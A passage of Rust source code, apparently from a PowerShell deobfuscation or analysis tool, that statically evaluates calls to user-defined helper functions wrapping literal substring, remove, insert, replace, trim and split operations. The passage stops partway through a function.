        let Some(caps) = PS_LITERAL_CONST_REPLACE_EXTRACTOR_BODY_RE
            .captures(&body)
            .or_else(|| PS_LITERAL_CONST_DOT_REPLACE_EXTRACTOR_BODY_RE.captures(&body))
        else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(needle) = caps
            .get(2)
            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
        else {
            continue;
        };
        let Some(repl) = caps
            .get(3)
            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
        else {
            continue;
        };
        if needle.is_empty() || needle.len() > 512 || repl.len() > 512 {
            continue;
        }

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_const_replace_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            &needle,
            &repl,
        );
    }
    out
}

fn expand_literal_trim_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !lower.contains(".trim")
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        if let Some(caps) = PS_LITERAL_TRIM_EXTRACTOR_BODY_RE.captures(&body) {
            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(kind) = caps
                .get(2)
                .and_then(|m| PsTrimKind::from_method(m.as_str()))
            else {
                continue;
            };
            let param_index = parse_ps_function_param_indices(&params);
            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let chars_var = caps.get(3).map(|m| m.as_str());
            let chars_idx = match chars_var {
                Some(chars_var) => {
                    match param_index.get(&chars_var.to_ascii_lowercase()).copied() {
                        Some(idx) => Some(idx),
                        None => continue,
                    }
                }
                None => None,
            };

            let spec = PsLiteralTrimExtractorSpec {
                value_idx,
                value_name: value_var,
                arg_count: param_index.len(),
                chars_idx,
                chars_name: chars_var,
                kind,
            };
            out = inline_ps_literal_trim_calls(&out, &name, spec);
            continue;
        }

        let Some(caps) = PS_LITERAL_CONST_TRIM_EXTRACTOR_BODY_RE.captures(&body) else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(kind) = caps
            .get(2)
            .and_then(|m| PsTrimKind::from_method(m.as_str()))
        else {
            continue;
        };
        let Some(chars) = caps
            .get(3)
            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
        else {
            continue;
        };
        if chars.is_empty() || chars.len() > 512 {
            continue;
        }

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_const_trim_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            kind,
            &chars,
        );
    }
    out
}

fn expand_literal_split_index_extractor_calls(text: &str) -> String {
    let lower = text.to_ascii_lowercase();
    if !has_literal_extractor_def_signal(&lower)
        || !has_split_index_extractor_signal(&lower)
        || !has_static_ps_literal_quote(text)
    {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
        if let Some(caps) = PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE
            .captures(&body)
            .or_else(|| PS_LITERAL_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE.captures(&body))
        {
            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(sep_var) = caps.get(2).map(|m| m.as_str()) else {
                continue;
            };
            let Some(index_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };

            let param_index = parse_ps_function_param_indices(&params);
            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let Some(sep_idx) = param_index.get(&sep_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
                continue;
            };

            let binding = PsSplitExtractorParamBinding {
                value_idx,
                value_name: value_var,
                sep_idx,
                sep_name: sep_var,
                index_idx,
                index_name: index_var,
                arg_count: param_index.len(),
            };
            out = inline_ps_literal_split_index_calls(&out, &name, binding);
            continue;
        }

        if let Some(caps) = PS_LITERAL_CONST_SEP_SPLIT_INDEX_EXTRACTOR_BODY_RE.captures(&body) {
            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(sep) = caps
                .get(2)
                .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
            else {
                continue;
            };
            let Some(index_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };
            if sep.is_empty() || sep.len() > 512 {
                continue;
            }

            let param_index = parse_ps_function_param_indices(&params);
            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
                continue;
            };
            let Some(index_idx) = param_index.get(&index_var.to_ascii_lowercase()).copied() else {
                continue;
            };

            let binding = PsConstSepSplitExtractorParamBinding {
                value_idx,
                value_name: value_var,
                index_idx,
                index_name: index_var,
                arg_count: param_index.len(),
                sep: &sep,
            };
            out = inline_ps_literal_const_sep_split_index_calls(&out, &name, binding);
            continue;
        }

        let Some(caps) = PS_LITERAL_CONST_SPLIT_INDEX_EXTRACTOR_BODY_RE
            .captures(&body)
            .or_else(|| PS_LITERAL_CONST_SPLIT_OPERATOR_INDEX_EXTRACTOR_BODY_RE.captures(&body))
        else {
            continue;
        };
        let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(sep) = caps
            .get(2)
            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
        else {
            continue;
        };
        let Some(index) = caps.get(3).and_then(|m| m.as_str().parse::<usize>().ok()) else {
            continue;
        };
        if sep.is_empty() || sep.len() > 512 || index > 4096 {
            continue;
        }

        let param_index = parse_ps_function_param_indices(&params);
        let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
            continue;
        };

        out = inline_ps_literal_const_split_index_calls(
            &out,
            &name,
            value_idx,
            value_var,
            param_index.len(),
            &sep,
            index,
        );
    }
    out
}

fn has_literal_extractor_def_signal(lower: &str) -> bool {
    lower.contains("function ")
        || lower.contains("new-item")
        || lower.contains("set-item")
        || has_new_item_alias_signal(lower)
        || has_set_item_alias_signal(lower)
}

fn has_static_ps_literal_quote(text: &str) -> bool {
    text.contains('\'') || text.contains('"')
}

fn has_new_item_alias_signal(lower: &str) -> bool {
    lower.starts_with("ni ")
        || lower.starts_with("n`i ")
        || [
            " ni ", "(ni ", ";ni ", "\nni ", " n`i ", "(n`i ", ";n`i ", "\nn`i ",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
}

fn has_set_item_alias_signal(lower: &str) -> bool {
    lower.starts_with("si ")
        || lower.starts_with("s`i ")
        || [
            " si ", "(si ", ";si ", "\nsi ", " s`i ", "(s`i ", ";s`i ", "\ns`i ",
        ]
        .iter()
        .any(|needle| lower.contains(needle))
}

fn literal_substring_extractor_defs(text: &str) -> Vec<(String, String, String)> {
    let bytes = text.as_bytes();
    let mut defs = Vec::new();
    for caps in PS_FUNCTION_DEF_RE.captures_iter(text) {
        let Some(full) = caps.get(0) else { continue };
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let mut pos = skip_ascii_ws(bytes, full.end());
        let (params, block_open) = if bytes.get(pos) == Some(&b'(') {
            let Some(params_end) = text[pos + 1..].find(')').map(|rel| pos + 1 + rel) else {
                continue;
            };
            let params = text[pos + 1..params_end].to_string();
            if params.len() > 256 {
                continue;
            }
            pos = skip_ascii_ws(bytes, params_end + 1);
            if bytes.get(pos) != Some(&b'{') {
                continue;
            }
            (params, pos)
        } else if bytes.get(pos) == Some(&b'{') {
            let Some(body_end) = find_simple_ps_block_end(text, pos, 4096) else {
                continue;
            };
            let body = &text[pos + 1..body_end];
            let Some(params) = parse_leading_ps_param_block(body) else {
                continue;
            };
            (params, pos)
        } else {
            continue;
        };
        let Some(body_end) = find_simple_ps_block_end(text, block_open, 4096) else {
            continue;
        };
        defs.push((
            name.to_string(),
            params,
            text[block_open + 1..body_end].to_string(),
        ));
    }
    for caps in PS_ITEM_FUNCTION_DEF_RE.captures_iter(text) {
        let Some(full) = caps.get(0) else { continue };
        let Some(header) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        if !PS_ITEM_FUNCTION_PATH_RE.is_match(header) || !PS_ITEM_FUNCTION_VALUE_RE.is_match(header)
        {
            continue;
        }
        let Some(name) = item_function_name(header) else {
            continue;
        };
        let block_open = full.end().saturating_sub(1);
        let Some(body_end) = find_simple_ps_block_end(text, block_open, 4096) else {
            continue;
        };
        let body = &text[block_open + 1..body_end];
        let Some(params) = parse_leading_ps_param_block(body) else {
            continue;
        };
        defs.push((name.to_string(), params, body.to_string()));
    }
    defs
}

fn item_function_name(header: &str) -> Option<&str> {
    PS_ITEM_FUNCTION_NAME_RE
        .captures(header)
        .and_then(|caps| caps.get(1).map(|m| m.as_str()))
        .or_else(|| {
            PS_ITEM_FUNCTION_PATH_NAME_RE
                .captures(header)
                .and_then(|caps| caps.get(1).map(|m| m.as_str()))
        })
}

fn parse_leading_ps_param_block(body: &str) -> Option<String> {
    let bytes = body.as_bytes();
    let pos = skip_ascii_ws(bytes, 0);
    let keyword_end = pos.checked_add(5)?;
    if !body.get(pos..keyword_end)?.eq_ignore_ascii_case("param")
        || is_ident_byte(bytes.get(keyword_end).copied())
    {
        return None;
    }
    let open = skip_ascii_ws(bytes, keyword_end);
    if bytes.get(open) != Some(&b'(') {
        return None;
    }
    let params_end = body[open + 1..].find(')').map(|rel| open + 1 + rel)?;
    let params = body[open + 1..params_end].to_string();
    (params.len() <= 256).then_some(params)
}

fn find_simple_ps_block_end(text: &str, open: usize, max_len: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    if bytes.get(open) != Some(&b'{') {
        return None;
    }
    let mut pos = open + 1;
    let limit = text.len().min(open.saturating_add(max_len));
    while pos < limit {
        match bytes[pos] {
            b'\'' => {
                let (end, _) = parse_ps_single_quoted_literal(text, pos)?;
                pos = end;
            }
            b'"' => {
                let (end, _) = parse_ps_static_quoted_literal(text, pos)?;
                pos = end;
            }
            b'{' => return None,
            b'}' => return Some(pos),
            _ => pos += 1,
        }
    }
    None
}

fn parse_ps_function_param_indices(params: &str) -> std::collections::HashMap<String, usize> {
    let mut out = std::collections::HashMap::new();
    for (idx, raw) in params.split(',').take(8).enumerate() {
        let raw = raw.trim();
        let Some(dollar) = raw.rfind('$') else {
            continue;
        };
        let name = raw[dollar + 1..]
            .chars()
            .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
            .collect::<String>();
        if !name.is_empty() {
            out.insert(name.to_ascii_lowercase(), idx);
        }
    }
    out
}

fn inline_ps_literal_substring_calls(
    text: &str,
    name: &str,
    binding: PsSubstringExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_substring_call(
                    text,
                    pos,
                    parenthesized,
                    binding.value_name,
                    binding.start_name,
                    binding.len_name,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, start, len)) =
                parse_ps_positional_literal_substring_args(text, pos, parenthesized, binding)
            else {
                search_from = end_name;
                continue;
            };
            if value.len() > 8192 {
                search_from = call_end;
                continue;
            }
            let end = if binding.len_idx.is_some() {
                let Some(len) = len else {
                    search_from = call_end;
                    continue;
                };
                let Some(end) = start.checked_add(len) else {
                    search_from = call_end;
                    continue;
                };
                end
            } else {
                value.len()
            };
            if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
                search_from = call_end;
                continue;
            }

            let replacement = format!("'{}'", value[start..end].replace('\'', "''"));
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_literal_const_substring_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    start: usize,
    len: Option<usize>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_const_substring_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    start,
                    len,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_const_substring_replacement(&value, start, len)
            else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_substring_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    start: usize,
    len: Option<usize>,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((
        call_end,
        ps_literal_const_substring_replacement(value, start, len)?,
    ))
}

fn ps_literal_const_substring_replacement(
    value: &str,
    start: usize,
    len: Option<usize>,
) -> Option<String> {
    if value.len() > 8192 || start > 8192 || len.is_some_and(|len| len > 8192) {
        return None;
    }
    let end = match len {
        Some(len) => start.checked_add(len)?,
        None => value.len(),
    };
    if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
        return None;
    }
    Some(format!("'{}'", value[start..end].replace('\'', "''")))
}

fn inline_ps_literal_const_remove_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    start: usize,
    count: Option<usize>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_const_remove_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    start,
                    count,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_const_remove_replacement(&value, start, count)
            else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_remove_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    start: usize,
    count: Option<usize>,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((
        call_end,
        ps_literal_const_remove_replacement(value, start, count)?,
    ))
}

fn ps_literal_const_remove_replacement(
    value: &str,
    start: usize,
    count: Option<usize>,
) -> Option<String> {
    if value.len() > 8192 || start > 8192 || count.is_some_and(|count| count > 8192) {
        return None;
    }
    if start > value.len() || !value.is_char_boundary(start) {
        return None;
    }
    let remove_end = match count {
        Some(count) => start.checked_add(count)?,
        None => value.len(),
    };
    if remove_end > value.len() || !value.is_char_boundary(remove_end) {
        return None;
    }
    let mut out = String::with_capacity(value.len().saturating_sub(remove_end - start));
    out.push_str(&value[..start]);
    out.push_str(&value[remove_end..]);
    (out.len() <= 8192).then(|| format!("'{}'", out.replace('\'', "''")))
}

fn ps_literal_extractor_call_needles(text: &str, name: &str) -> Vec<String> {
    let mut needles = vec![name.to_ascii_lowercase()];
    for (var, value) in ps_string_bindings(text) {
        if value.eq_ignore_ascii_case(name) {
            needles.push(format!("${var}"));
        }
    }
    needles.sort();
    needles.dedup();
    needles
}

fn ps_literal_extractor_call_start_and_arg_pos(
    bytes: &[u8],
    call_start: usize,
    end_name: usize,
) -> Option<(usize, usize)> {
    let prev = bytes.get(call_start.wrapping_sub(1)).copied();
    let next = bytes.get(end_name).copied();
    if call_start > 0 && matches!(prev, Some(b'\'' | b'"')) && next == prev {
        let quote_start = call_start - 1;
        let mut before_quote = quote_start;
        while before_quote > 0 && bytes[before_quote - 1].is_ascii_whitespace() {
            before_quote -= 1;
        }
        let amp = before_quote.checked_sub(1)?;
        if bytes.get(amp) != Some(&b'&') || bytes.get(amp.wrapping_sub(1)) == Some(&b'&') {
            return None;
        }
        return Some((amp, skip_ascii_ws(bytes, end_name + 1)));
    }
    if is_ident_byte(prev) || is_ident_byte(next) {
        return None;
    }
    Some((
        preceding_call_operator_start(bytes, call_start).unwrap_or(call_start),
        skip_ascii_ws(bytes, end_name),
    ))
}

fn preceding_call_operator_start(bytes: &[u8], token_start: usize) -> Option<usize> {
    let mut before_token = token_start;
    while before_token > 0 && bytes[before_token - 1].is_ascii_whitespace() {
        before_token -= 1;
    }
    let amp = before_token.checked_sub(1)?;
    if bytes.get(amp) != Some(&b'&') || bytes.get(amp.wrapping_sub(1)) == Some(&b'&') {
        return None;
    }
    Some(amp)
}

#[derive(Clone, Copy)]
struct PsSubstringExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    arg_count: usize,
    start_idx: usize,
    start_name: &'a str,
    len_idx: Option<usize>,
    len_name: Option<&'a str>,
}

fn parse_ps_positional_literal_substring_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsSubstringExtractorParamBinding<'_>,
) -> Option<(usize, String, usize, Option<usize>)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.start_idx >= binding.arg_count
        || binding.len_idx.is_some_and(|idx| idx >= binding.arg_count)
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut start = None;
    let mut len = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.start_idx {
            start = Some(arg.as_usize()?);
        }
        if binding.len_idx == Some(idx) {
            len = Some(arg.as_usize()?);
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, start?, len))
}

fn inline_ps_named_literal_substring_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    start_name: &str,
    len_name: Option<&str>,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_literal()?;
    let start = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(start_name))?
        .1
        .as_usize()?;
    if value.len() > 8192 {
        return None;
    }
    let end = if let Some(len_name) = len_name {
        let len = args
            .iter()
            .find(|(name, _)| name.eq_ignore_ascii_case(len_name))?
            .1
            .as_usize()?;
        start.checked_add(len)?
    } else {
        value.len()
    };
    if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
        return None;
    }
    Some((
        call_end,
        format!("'{}'", value[start..end].replace('\'', "''")),
    ))
}

#[derive(Clone, Copy)]
struct PsRemoveExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    arg_count: usize,
    start_idx: usize,
    start_name: &'a str,
    count_idx: Option<usize>,
    count_name: Option<&'a str>,
}

fn inline_ps_literal_remove_calls(
    text: &str,
    name: &str,
    binding: PsRemoveExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_remove_call(
                    text,
                    pos,
                    parenthesized,
                    binding.value_name,
                    binding.start_name,
                    binding.count_name,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, start, count)) =
                parse_ps_positional_literal_remove_args(text, pos, parenthesized, binding)
            else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_remove_replacement(&value, start, count) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn parse_ps_positional_literal_remove_args(
    text: &str,
    mut pos: usize,
    parenthesized: bool,
    binding: PsRemoveExtractorParamBinding<'_>,
) -> Option<(usize, String, usize, Option<usize>)> {
    if binding.arg_count == 0
        || binding.arg_count > 8
        || binding.value_idx >= binding.arg_count
        || binding.start_idx >= binding.arg_count
        || binding
            .count_idx
            .is_some_and(|idx| idx >= binding.arg_count)
    {
        return None;
    }

    let bytes = text.as_bytes();
    let mut value = None;
    let mut start = None;
    let mut count = None;
    let mut arg_end = pos;
    for idx in 0..binding.arg_count {
        let (next_end, arg) = parse_ps_literal_or_usize_arg(text, pos)?;
        if idx == binding.value_idx {
            value = Some(arg.as_str()?.to_string());
        }
        if idx == binding.start_idx {
            start = Some(arg.as_usize()?);
        }
        if binding.count_idx == Some(idx) {
            count = Some(arg.as_usize()?);
        }
        arg_end = next_end;
        pos = next_end;
        if idx + 1 < binding.arg_count {
            pos = skip_ps_arg_separator(bytes, pos, parenthesized);
        }
    }

    if parenthesized {
        let after = skip_ascii_ws(bytes, arg_end);
        if bytes.get(after) != Some(&b')') {
            return None;
        }
        arg_end = after + 1;
    }

    Some((arg_end, value?, start?, count))
}

fn inline_ps_named_literal_remove_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    start_name: &str,
    count_name: Option<&str>,
) -> Option<(usize, String)> {
    let (call_end, args) =
        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_literal()?;
    let start = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(start_name))?
        .1
        .as_usize()?;
    let count = if let Some(count_name) = count_name {
        Some(
            args.iter()
                .find(|(name, _)| name.eq_ignore_ascii_case(count_name))?
                .1
                .as_usize()?,
        )
    } else {
        None
    };
    Some((
        call_end,
        ps_literal_remove_replacement(value, start, count)?,
    ))
}

fn ps_literal_remove_replacement(
    value: &str,
    start: usize,
    count: Option<usize>,
) -> Option<String> {
    if value.len() > 8192 {
        return None;
    }
    let end = if let Some(count) = count {
        start.checked_add(count)?
    } else {
        value.len()
    };
    if end > value.len() || !value.is_char_boundary(start) || !value.is_char_boundary(end) {
        return None;
    }
    let mut recovered = String::with_capacity(value.len() - (end - start));
    recovered.push_str(&value[..start]);
    recovered.push_str(&value[end..]);
    Some(format!("'{}'", recovered.replace('\'', "''")))
}

#[derive(Clone, Copy)]
struct PsInsertExtractorParamBinding<'a> {
    value_idx: usize,
    value_name: &'a str,
    arg_count: usize,
    start_idx: usize,
    start_name: &'a str,
    insert_idx: usize,
    insert_name: &'a str,
}

fn inline_ps_literal_const_insert_calls(
    text: &str,
    name: &str,
    value_idx: usize,
    value_name: &str,
    arg_count: usize,
    start: usize,
    insert: &str,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_const_insert_call(
                    text,
                    pos,
                    parenthesized,
                    value_name,
                    start,
                    insert,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value)) = parse_ps_positional_static_literal_arg(
                text,
                pos,
                parenthesized,
                value_idx,
                arg_count,
            ) else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_insert_replacement(&value, start, insert) else {
                search_from = call_end;
                continue;
            };
            matches.push((replace_start, call_end, replacement));
            search_from = call_end;
            match_count += 1;
        }
    }

    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

fn inline_ps_named_literal_const_insert_call(
    text: &str,
    pos: usize,
    parenthesized: bool,
    value_name: &str,
    start: usize,
    insert: &str,
) -> Option<(usize, String)> {
    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
    let value = args
        .iter()
        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
        .1
        .as_str();
    Some((
        call_end,
        ps_literal_insert_replacement(value, start, insert)?,
    ))
}

fn inline_ps_literal_insert_calls(
    text: &str,
    name: &str,
    binding: PsInsertExtractorParamBinding<'_>,
) -> String {
    let lower = text.to_ascii_lowercase();
    let needles = ps_literal_extractor_call_needles(text, name);
    let bytes = text.as_bytes();
    let mut matches = Vec::new();
    let mut match_count = 0;

    for needle in needles {
        let mut search_from = 0;
        while match_count < 128 {
            let Some(rel) = lower[search_from..].find(&needle) else {
                break;
            };
            let call_start = search_from + rel;
            let end_name = call_start + needle.len();
            let Some((replace_start, mut pos)) =
                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
            else {
                search_from = end_name;
                continue;
            };
            let parenthesized = bytes.get(pos) == Some(&b'(');
            if parenthesized {
                pos = skip_ascii_ws(bytes, pos + 1);
            }
            if bytes.get(pos) == Some(&b'-') {
                if let Some((call_end, replacement)) = inline_ps_named_literal_insert_call(
                    text,
                    pos,
                    parenthesized,
                    binding.value_name,
                    binding.start_name,
                    binding.insert_name,
                ) {
                    matches.push((replace_start, call_end, replacement));
                    search_from = call_end;
                    match_count += 1;
                    continue;
                }
            }
            let Some((call_end, value, start, insert)) =
                parse_ps_positional_literal_insert_args(text, pos, parenthesized, binding)
            else {
                search_from = end_name;
                continue;
            };
            let Some(replacement) = ps_literal_insert_replacement(&value, start, &insert) else {
